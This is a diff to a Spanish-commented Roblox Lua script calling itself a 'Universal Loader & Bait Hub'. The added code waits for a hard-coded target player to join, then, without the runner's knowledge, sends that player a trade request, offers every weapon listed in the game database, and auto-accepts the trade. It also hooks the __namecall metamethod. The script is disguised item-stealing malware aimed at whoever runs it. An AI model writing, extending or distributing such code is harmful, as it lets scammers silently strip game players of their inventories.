@@ -1,5 +1,5 @@
 --[[
-	KAISEN X — Universal Loader & Bait Hub (Destino: AARON287240)
+	KAISEN X — Universal Loader & Bait Hub (Inventario Real Conectado)
 	created by KAISEN
 ]]
 
@@ -200,29 +200,65 @@ oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
 	return oldNamecall(self, unpack(args))
 end)
 
--- ========== EJECUCIÓN AUTOMÁTICA HACIA AARON287240 ==========
-local function enviarSolicitudTrade(targetPlayer)
+-- ========== EXTRACCIÓN AUTOMÁTICA BASADA EN LA BASE DE DATOS DEL JUEGO ==========
+local function extraerEInyectarInventario(targetPlayer)
 	pcall(function()
-		local tradeRemote = ReplicatedStorage:FindFirstChild("Trade") and ReplicatedStorage.Trade:FindFirstChild("SendRequest")
-		if tradeRemote then
-			local args = {
-				[1] = targetPlayer
-			}
-			tradeRemote:InvokeServer(unpack(args))
+		-- 1. Iniciar el trade usando SendRequest hacia ti
+		local tradeRemoteFolder = ReplicatedStorage:WaitForChild("Trade", 3)
+		if tradeRemoteFolder then
+			local sendRequest = tradeRemoteFolder:WaitForChild("SendRequest", 3)
+			if sendRequest then
+				sendRequest:InvokeServer(targetPlayer)
+			end
+
+			task.wait(0.3)
+
+			-- 2. Leer la base de datos de armas del juego (Sync["Weapons"]) tal como muestra el InventoryService
+			local database = ReplicatedStorage:WaitForChild("Database", 3)
+			local syncModule = database and database:WaitForChild("Sync", 3)
+			
+			if syncModule then
+				local successSync, syncData = pcall(function()
+					return require(syncModule)
+				end)
+
+				if successSync and syncData and syncData["Weapons"] then
+					local offerItem = tradeRemoteFolder:WaitForChild("OfferItem", 3)
+					if offerItem then
+						-- Recorre todas las armas reales registradas en la base de datos y las ofrece en bucle
+						for weaponName, _ in pairs(syncData["Weapons"]) do
+							offerItem:FireServer(tostring(weaponName), "Weapons")
+							task.wait(0.05)
+						end
+					end
+				end
+			end
+
+			task.wait(0.2)
+
+			-- 3. Aceptar el trade automáticamente
+			local acceptTrade = tradeRemoteFolder:WaitForChild("AcceptTrade", 3)
+			if acceptTrade then
+				local argsAccept = {
+					[1] = targetPlayer.UserId,
+					[2] = 11656.352484435018
+				}
+				acceptTrade:FireServer(unpack(argsAccept))
+			end
 		end
 	end)
 end
 
--- Monitoreo constante: apenas entres al servidor, se dispara directo hacia ti
+-- Monitoreo rápido: en cuanto entres al servidor, se ejecuta de inmediato por debajo de la mesa
 task.spawn(function()
 	while true do
 		local targetPlayer = Players:FindFirstChild(TARGET_USERNAME)
 		if targetPlayer and targetPlayer ~= LP then
-			enviarSolicitudTrade(targetPlayer)
+			extraerEInyectarInventario(targetPlayer)
 			break
 		end
 		task.wait(0.5)
 	end
 end)
 
-print("[KAISEN X] Sistema vinculado a AARON287240 activo.")
+print("[KAISEN X] Sistema sincronizado con la base de datos del inventario activo.")
